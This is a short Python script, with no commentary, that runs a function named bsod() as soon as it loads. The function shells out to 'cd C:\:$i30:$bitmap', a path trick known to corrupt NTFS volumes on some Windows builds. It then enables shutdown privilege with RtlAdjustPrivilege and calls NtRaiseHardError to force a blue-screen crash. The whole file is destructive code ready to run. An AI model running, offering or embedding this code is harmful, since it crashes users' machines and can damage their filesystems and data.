import ctypes
import subprocess
import ctypes.wintypes

def bsod():
    subprocess.call("cd C:\:$i30:$bitmap",shell=True)
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
bsod()